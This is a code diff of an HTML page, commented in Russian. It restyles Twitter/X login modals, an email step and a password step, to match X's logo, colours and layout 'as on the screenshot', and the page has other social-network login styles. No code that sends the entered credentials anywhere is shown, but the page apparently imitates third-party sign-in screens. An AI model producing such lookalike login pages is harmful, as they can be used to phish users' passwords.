@@ -499,11 +499,6 @@
             color: white;
         }
         
-        .modal-blue {
-            background: #1877F2;
-            color: white;
-        }
-        
         .close-modal {
             position: absolute;
             top: 15px;
@@ -521,19 +516,20 @@
             color: white;
         }
         
-        .modal-blue .close-modal {
-            color: white;
-        }
-        
         .close-modal:hover {
             color: #333;
         }
         
         /* Twitter/X стиль - ДВУХЭТАПНЫЙ ВХОД */
+        .x-modal-step1 {
+            padding: 30px;
+        }
+        
         .x-logo {
             width: 40px;
             height: 40px;
-            margin-bottom: 30px;
+            margin: 0 auto 30px;
+            display: block;
         }
         
         .x-title {
@@ -542,6 +538,7 @@
             margin-bottom: 40px;
             font-family: Arial, sans-serif;
             color: #0F1419;
+            text-align: center;
         }
         
         .modal-dark .x-title {
@@ -680,6 +677,7 @@
             color: #536471;
             font-size: 15px;
             font-family: Arial, sans-serif;
+            text-align: center;
         }
         
         .modal-dark .x-footer {
@@ -696,17 +694,34 @@
             text-decoration: underline;
         }
         
-        /* Twitter/X модальное окно для пароля (этап 2) */
+        /* Twitter/X модальное окно для пароля (этап 2) - БЕЛЫЙ ФОН как на скриншоте */
+        .x-modal-step2 {
+            background: white;
+            color: #0F1419;
+            padding: 30px;
+        }
+        
+        .x-step2-title {
+            font-size: 23px;
+            font-weight: 700;
+            margin-bottom: 30px;
+            text-align: center;
+            font-family: Arial, sans-serif;
+            color: #0F1419;
+        }
+        
         .x-user-info {
             margin-bottom: 30px;
             padding-bottom: 20px;
-            border-bottom: 1px solid #2F3336;
+            border-bottom: 1px solid #EFF3F4;
         }
         
         .x-user-email {
-            font-size: 15px;
-            color: #E7E9EA;
-            margin-bottom: 5px;
+            font-size: 16px;
+            color: #0F1419;
+            margin-bottom: 8px;
+            font-weight: 500;
+            font-family: Arial, sans-serif;
         }
         
         .x-switch-account {
@@ -720,15 +735,23 @@
             text-decoration: underline;
         }
         
+        .x-password-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #536471;
+            font-size: 14px;
+            font-family: Arial, sans-serif;
+        }
+        
         .x-password-input {
             width: 100%;
             padding: 15px;
             margin-bottom: 20px;
-            border: 1px solid #536471;
+            border: 1px solid #CFD9DE;
             border-radius: 4px;
             font-size: 17px;
-            background: #000;
-            color: white;
+            background: white;
+            color: #0F1419;
             font-family: Arial, sans-serif;
         }
         
@@ -740,8 +763,8 @@
         .x-login-btn {
             width: 100%;
             padding: 15px;
-            background: white;
-            color: black;
+            background: #0F1419;
+            color: white;
             border: none;
             border-radius: 30px;
             font-size: 16px;
@@ -752,7 +775,41 @@
         }
         
         .x-login-btn:hover {
-            background: #E7E9EA;
+            background: #272C30;
+        }
+        
+        .x-forgot-password {
+            display: block;
+            text-align: center;
+            color: #1D9BF0;
+            text-decoration: none;
+            font-size: 15px;
+            margin-bottom: 20px;
+            font-family: Arial, sans-serif;
+        }
+        
+        .x-forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .x-step2-footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #EFF3F4;
+            color: #536471;
+            font-size: 15px;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        
+        .x-step2-footer a {
+            color: #1D9BF0;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .x-step2-footer a:hover {
+            text-decoration: underline;
         }
         
         /* ВКонтакте стиль */
@@ -1333,9 +1390,9 @@
 
     <!-- Модальные окна для входа -->
     
-    <!-- Twitter/X модальное окно (этап 1: email/username) -->
+    <!-- Twitter/X модальное окно (этап 1: email/username) - ЧЕРНЫЙ ФОН -->
     <div class="modal-overlay modal-dark" id="xModalStep1">
-        <div class="modal modal-dark">
+        <div class="modal modal-dark x-modal-step1">
             <button class="close-modal" onclick="closeModal('xModalStep1')">&times;</button>
             <div class="x-logo">
                 <svg viewBox="0 0 24 24" aria-hidden="true" style="width: 40px; height: 40px; fill: white;">
@@ -1378,32 +1435,34 @@
         </div>
     </div>
     
-    <!-- Twitter/X модальное окно (этап 2: пароль) -->
-    <div class="modal-overlay modal-dark" id="xModalStep2">
-        <div class="modal modal-dark">
+    <!-- Twitter/X модальное окно (этап 2: пароль) - БЕЛЫЙ ФОН как на скриншоте -->
+    <div class="modal-overlay" id="xModalStep2">
+        <div class="modal x-modal-step2">
             <button class="close-modal" onclick="closeModal('xModalStep2')">&times;</button>
+            
             <div class="x-logo">
-                <svg viewBox="0 0 24 24" aria-hidden="true" style="width: 40px; height: 40px; fill: white;">
+                <svg viewBox="0 0 24 24" aria-hidden="true" style="width: 40px; height: 40px; fill: #0F1419;">
                     <g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g>
                 </svg>
             </div>
+            
+            <h2 class="x-step2-title">Введите пароль</h2>
             
             <div class="x-user-info">
                 <div class="x-user-email" id="xUserEmail">user@example.com</div>
                 <a href="#" class="x-switch-account" onclick="switchXAccount()">Сменить аккаунт</a>
             </div>
             
-            <h1 class="x-title">Введите пароль</h1>
-            
             <form id="xPasswordForm">
+                <label class="x-password-label">Пароль</label>
                 <input type="password" class="x-password-input" placeholder="Пароль" required>
                 
                 <button type="submit" class="x-login-btn">Войти</button>
             </form>
             
-            <a href="#" class="x-link" style="display: block; text-align: center; margin-bottom: 20px;">Забыли пароль?</a>
+            <a href="#" class="x-forgot-password">Забыли пароль?</a>
             
-            <div class="x-footer">
+            <div class="x-step2-footer">
                 Нет аккаунта? <a href="#">Зарегистрироваться</a>
             </div>
         </div>
